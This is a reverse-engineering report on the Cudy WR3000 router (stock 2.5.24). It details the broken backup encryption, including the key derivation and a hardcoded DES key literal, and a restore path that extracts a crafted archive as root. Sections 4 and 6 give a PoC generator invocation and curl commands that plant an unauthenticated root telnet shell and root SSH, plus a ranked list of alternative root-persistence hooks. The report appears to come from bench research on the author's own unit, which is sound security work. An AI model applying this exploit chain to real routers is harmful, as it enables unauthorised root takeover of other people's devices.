# Stock backup crypt broken -> arbitrary root file write (Cudy WR3000 v2.0, stock 2.5.24)

**Lane:** cudy-crypt (host-only RE; no device action was performed).
**Status:** 2026-11-22 - encryption format reversed and validated; PoC container generator delivered; restore semantics confirmed from the extracted stock rootfs.
**Inputs (local, never committed):** two live backup downloads (20854 B), extracted stock 2.5.24 rootfs, local mtd6 bdinfo dump, ARM toolchain objdump + capstone + tools/luadump.py.

## TL;DR

1. The backup container is **AES-128-CBC over MD5(hostname + "@" + bdinfo secret)**, with a
   48-byte header and independent zero-IV CBC per 0x400-byte chunk (vendor format below).
2. Proof: a real download decrypts to a **gzip tar.gz with 85 members**, and re-encrypting the
   recovered header+payload with this implementation is **byte-identical to the 20854-byte sample**
   (selftest prints BYTE-IDENTICAL).
3. The LuCI "Restore backup" path runs, as root:
   crypt -d -i /tmp/backup.bin -o /tmp/backup.tar.gz, then
   **tar -C / -xzf /tmp/backup.tar.gz (no whitelist / no member validation)**, then
   preset defaults (sources /etc/uci-defaults/* as root), then reboot
   (/etc/init.d/done runs sh /etc/rc.local at boot). That is an **arbitrary root file write**
   plus two root-exec primitives.
4. craft_backup.py emit produces a valid encrypted container (about 1 KB) whose payload drops
   /etc/rc.local, /etc/uci-defaults/99-omo-arm, an optional root authorized_keys and a
   dropbear config. Upload it through the LuCI backup page (UI or curl below); after the restore
   reboot the box is still stock but has a root channel (telnet 23 via the payload login provider,
   root SSH with the project key).
5. **Top blocker:** the key is bound to *this* unit's hostname + bdinfo secret
   (hostname WR3000 comes from bdinfo board; the secret lives in the mtd6 bdinfo partition).
   The secret is a credential (CVE-2026-71960 fleet key) and is **not** in this repo; the tool
   reads it from a local dump. Everything else is fully reproducible off-device.

## 1. Format of the stock backup (/usr/bin/crypt, default mode)

The restore/download paths call crypt with **no mode flag** (-a/-g/-n absent), i.e. mode 0.
The mode/format code is in /usr/bin/crypt at these offsets (ARM, stripped, 13612 B):

| what | where |
| --- | --- |
| main (getopt + dispatch + container I/O) | 0x10bec-0x11ec8 |
| key derivation (gethostname, bdinfo_get_value board/secret, MD5, AES_set_*_key) | 0x12228-0x12390 |
| per-buffer CBC helpers (zero IV; AES-128) | 0x123b8 (encrypt), 0x1245c (decrypt) |
| /etc/rom_version reader | 0x124fc |
| header magic / timestamp / random / version writes | 0x10eac-0x10efc |
| chunk loop + vendor final-chunk padding | 0x10f1c-0x1122c, decrypt 0x115b0-0x11ecc |

### Key

    key_string = gethostname() + "@" + bdinfo_get_value("secret")
    key        = MD5(key_string)                    -> 16-byte AES-128 key

* gethostname() on stock 2.5.24 is bdinfo board (/bin/config_generate writes
  system.@system[-1].hostname='$(bdinfo board)'), i.e. **WR3000** for this board.
* bdinfo_get_value("secret") is read from the mtd6 bdinfo partition, which is
  DES-CBC encrypted (key literal 88T3j05dtFu8= via OpenSSL DES_string_to_key, zero IV).
  Decode with the repo's tools/decrypt_bdinfo.py (or craft_backup.py itself); the value is
  device/fleet material and is deliberately not reproduced here.
* Other modes seen in /usr/bin/crypt (not used by backup/restore):
  -g = MD5("@" + secret); -a = MD5(board + "@aes#hex"); -n = explicit -l/-k/-v AES.

### Container layout

    48-byte header, AES-128-CBC(key, IV=0):
        +0x00  u32 LE  magic 0xa1ecd5bd                (bytes bd d5 ec a1)
        +0x04  u32 LE  unix timestamp (__time64)
        +0x08  u32 LE  random()                        (unseeded libc -> constant per boot)
        +0x0c  4 bytes zero
        +0x10  32 bytes  /etc/rom_version, NUL padded  ("2.5.24-20260727-122111")

    payload: chunks of 0x400 bytes, EACH chunk AES-128-CBC(key, IV=0), written raw.
      full chunk  -> 1024 ciphertext bytes
      final chunk R (R < 1024):
          k = R % 16
          buf = data[0:R] + zeros;  buf[R+k] = k
          enc_len = (R + k + 16) & ~0xf
          write AES-CBC(buf[0:enc_len]) + (R + k + 16 - enc_len) zero bytes
      on decode: n = final chunk length; pt = decrypt(chunk[0:n & ~0xf]);
                 out_len = n - 16 - pt[n-16]  (if pt[n-16] <= n-16, else n-16)

crypt -d additionally prints to **stdout**

    timestamp: <u32>
    build: <rom_version>

which LuCI's restore CBI parses (echo '...' | grep timestamp/build | awk '{print $2}').

## 2. Validation evidence (all local)

Reproduce with .provision-venv/bin/python craft_backup.py selftest ... (pycryptodome):

    [+] decrypt /tmp/cudy-backup/backup_sample.bin: gzip OK, 85 members,
        sha256(payload)=ea6fde9ba41b35530cc68d3d48e982716f62d624179cb8fe85f11a82e0e775e8
    [+] re-encrypt with the same header+payload: BYTE-IDENTICAL (20854 bytes)
    [+] codec == vendor /usr/bin/crypt default mode

Hashes of the local material (not committed):

    sha256 /usr/bin/crypt             e10bc0da863ad8ed8c8f16e6ef230e2423e117072726bf747084b01c16e9297f
    sha256 backup_sample.bin          3229fa5fe99982df7a730984da8b12afb34f5a4e60d2c0a72dcb0bd4e1ff2d07
    sha256 backup_sample2.bin         3229fa5fe99982df7a730984da8b12afb34f5a4e60d2c0a72dcb0bd4e1ff2d07
    decrypted payload                 20787 B tar.gz (85 members), sha256 ea6fde9b...
    header: magic 0xa1ecd5bd, timestamp 1795358699, build 2.5.24-20260727-122111

The decrypted archive is a normal sysupgrade -b keep-list backup: etc/config/* (all vendor
services), etc/crontabs/root, etc/dropbear/*_host_key, etc/passwd, etc/shadow, etc/hosts,
etc/nftables.d/*, etc/strongswan.d/*, etc/uhttpd.crt/key, etc. Note the two downloads are
**byte-identical** (same second + unseeded random()), so "differs per download" is not observed.

## 3. Restore semantics (stock 2.5.24)

Exact chain, from the extracted rootfs:

1. LuCI backup page (/usr/lib/lua/luci/model/cbi/system/backup.lua, bytecode): the file upload
   handler writes the POST body to /tmp/backup.bin; when cbid.backup.1.restore.upload is set
   it runs crypt -d -i /tmp/backup.bin -o /tmp/backup.tar.gz, parses the timestamp/build
   stdout lines, and offers a **Restore** button (cbid.backup.1.proceed).
2. On proceed: tar -tzf /tmp/backup.tar.gz >/dev/null is the **only** check, then it schedules
   removal of /tmp/backup.bin and redirects to admin/system/reboot?backup=.
3. luci.controller.system.action_reboot (bytecode constants) runs via luci.sys.fork_exec:
   sleep 1; /etc/init.d/uhttpd stop; sysupgrade -r /tmp/backup.tar.gz && preset defaults && reboot
4. /sbin/sysupgrade (lines 302-310): tar -C / -x...zf "$CONF_RESTORE" - extracts
   **every archive member as root relative to /**, no keep-list, no path/member validation,
   overwriting existing files. Busybox v1.35.0 tar (ustar; -z supported; strips leading /).
   Members with relative paths are all that is needed - no ../ traversal required, so
   whether busybox accepts ../ members is irrelevant and was not tested on-device.
5. /sbin/preset preset_uci_defaults() (lines 30-45): copies /rom/etc/uci-defaults/* into
   /etc/uci-defaults/ and **sources every file** there as root. This runs inside the restore,
   before reboot - immediate root command execution.
6. reboot; at boot /etc/init.d/done (START=95, lines 14-16) runs sh /etc/rc.local if present.

LuCI POST details (used by curl below): file field cbid.backup.1.restore,
flag cbid.backup.1.restore.upload=true, plus token and cbi.submit; the Restore click posts
cbid.backup.1.proceed=1; the restore itself is the GET
/cgi-bin/luci/admin/system/reboot?backup= (action_reboot reads formvalue backup and fork_execs
the restore chain). Upload cap is 32768 KiB (cbi.js default filesize); the crafted container
is tiny.

## 4. PoC usage

### Build the container

    cd opensource/docs/incoming/cudy-backup-root
    REPO=$(cd ../../../.. && pwd)              # main checkout root (has .provision-venv/ and dumps/)
    PY=$REPO/.provision-venv/bin/python       # needs pycryptodome

    $PY craft_backup.py emit \
        --bdinfo $REPO/dumps/router-20261108/full/mtd6-bdinfo.bin \
        --ssh-key $REPO/.omo-secrets/router_ed25519.pub \
        -o /tmp/crafted_backup.bin

emit self-checks by decrypting its own output and prints the members, e.g.:

    etc/rc.local
    etc/omo_login.sh
    etc/uci-defaults/99-omo-arm
    root/.ssh/authorized_keys
    etc/dropbear/authorized_keys
    etc/config/dropbear
    [+] container: /tmp/crafted_backup.bin (836 bytes, sha256 ...)
    [+] self-check decrypt: OK

Why these files:

* etc/rc.local - runs as root on every boot (etc/init.d/done, START=95): starts
  /usr/sbin/telnetd -p 23 -l /etc/omo_login.sh (busybox telnetd, non-authenticated root shell
  on the bench LAN) and restarts dropbear.
* etc/omo_login.sh - the telnetd "login" provider: exec /bin/ash --login (root shell).
* etc/uci-defaults/99-omo-arm - sourced as root during preset defaults (immediate window
  before the reboot; also logs /tmp/omo-restore.log).
* root/.ssh/authorized_keys + etc/dropbear/authorized_keys - project key (only added when
  --ssh-key is passed; public key only).
* etc/config/dropbear - enables PasswordAuth/RootPasswordAuth/port 22 (only with --ssh-key).

--flash-url URL additionally drops a uci-defaults script that wgets an image and runs
sysupgrade -n during the restore (optional; not used by default).

### Upload (UI, simplest - Lead has a LuCI session)

1. Open System -> Backup / Flash Firmware (/cgi-bin/luci/admin/system/backup).
2. "Restore backup": choose /tmp/crafted_backup.bin; the AJAX upload starts and the page
   re-renders showing MD5/Size/Generate time/Generate version.
3. Click **Restore**, confirm. The box stops uhttpd, restores, reboots (~1 min).
4. Root channels on the bench LAN: telnet 192.168.10.1 (root shell), or
   ssh -i .omo-secrets/router_ed25519 root@192.168.10.1.

### Upload (curl, for automation)

    B=http://192.168.10.1/cgi-bin/luci
    COOKIE='sysauth_https=...'          # copy the full cookie header from the browser session
    TOKEN=$(curl -s -b "$COOKIE" "$B/admin/system/backup" \
            | sed -n 's/.*name="token" value="\([^"]*\)".*/\1/p' | head -1)

    # 1) upload + decrypt (handler runs crypt -d, response shows the parsed info)
    curl -s -b "$COOKIE" \
      -F "cbid.backup.1.restore.upload=true" \
      -F "cbid.backup.1.restore=@/tmp/crafted_backup.bin;filename=backup.bin" \
      -F "token=$TOKEN" -F "cbi.submit=1" \
      "$B/admin/system/backup" >/dev/null

    # 2) accept the restore (tar -tzf check, then 302 to reboot?backup=)
    curl -s -b "$COOKIE" -L \
      -d "token=$TOKEN" -d "cbi.submit=1" -d "cbid.backup.1.proceed=1" \
      "$B/admin/system/backup" >/dev/null

    # if -L is skipped: curl -s -b "$COOKIE" "$B/admin/system/reboot?backup="

### Cleanup (after the lead has the root shell)

    rm -f /etc/rc.local /etc/omo_login.sh /etc/uci-defaults/99-omo-arm
    # optional: restore the original /etc/config/dropbear and /root/.ssh if used
    /etc/init.d/dropbear restart

## 5. Risks

* The restore path **reboots the box** and then re-runs preset defaults; the box stays on stock
  firmware. The default payload only *adds* files (it does not overwrite /etc/config/* except
  the optional dropbear config), so a failed restore leaves stock configs intact.
* It opens an **unauthenticated root telnet on port 23** (bench LAN only) plus root SSH with the
  project key. Close it when the lead is done; this is not a shipped configuration.
* A malformed/wrong-key container is rejected by LuCI ("File is invalid") and nothing is restored.
  Recovery is unchanged (physical RESET-hold + TFTP). No flash/mtd write is involved in this lane.
* The container is bound to the unit's hostname + bdinfo secret. If the box hostname was changed,
  --hostname must be overridden or LuCI will reject the file. Use the target unit's own bdinfo
  dump (mtd6).
* Do not commit the bdinfo dump, the samples, or a decrypted backup: they contain the fleet secret,
  root password hash, dropbear host keys and Wi-Fi credentials. Only craft_backup.py +
  REPORT.md are committed.

## 6. Ranked fallback if arbitrary paths were blocked

Arbitrary relative paths under / are **not** blocked (tar -C / -xzf, no whitelist), so this is
the primary path. If a future firmware adds filtering, ranked fallbacks (most to least reliable):

1. etc/uci-defaults/<name> - sourced as root by preset defaults *inside the restore* (no reboot
   needed; highest reliability, but writes under /etc are assumed allowed).
2. etc/rc.local - run as root by /etc/init.d/done on every boot; persistent.
3. etc/shadow (known root hash) + root/.ssh/authorized_keys + etc/config/dropbear - root SSH;
   needs the write set to include the specific files.
4. etc/crontabs/root (@reboot) - cron is enabled in stock rc.d (S50cron); delayed root exec.
5. etc/config/firewall with an option type 'script' include - fw4 executes the include as root
   at boot (config-only, no extra script file needed).
6. etc/config/dhcp dnsmasq dhcpscript / odhcpd script hooks - event-driven root exec,
   less deterministic.
7. etc/init.d/<name> + etc/rc.d/S99<name> symlink member - tar can carry the symlink; boot
   init hook (more moving parts than rc.local).
8. /etc/dropbear/authorized_keys alone - only useful if dropbear already runs and key auth is
   accepted (weaker; included in the default payload anyway).

Config-only code-exec notes: /etc/config entries alone generally do not execute shell, except
firewall include scripts (5) and DHCP script hooks (6); luci/rpcd configs are not an exec path.

## 7. Files

* craft_backup.py - encoder/decoder + PoC generator (this directory).
  Subcommands: emit, decrypt, selftest.
* REPORT.md - this document.
* Local (not committed): /tmp/cudy-backup/backup_sample{,2}.bin, decrypted
  /tmp/backup_sample.tar.gz, generated /tmp/crafted_backup.bin, /tmp/crafted.tar.gz,
  bdinfo dump under dumps/.

Reproduce:

    $REPO/.provision-venv/bin/python craft_backup.py selftest \
        --sample /tmp/cudy-backup/backup_sample.bin \
        --bdinfo ../../../../dumps/router-20261108/full/mtd6-bdinfo.bin
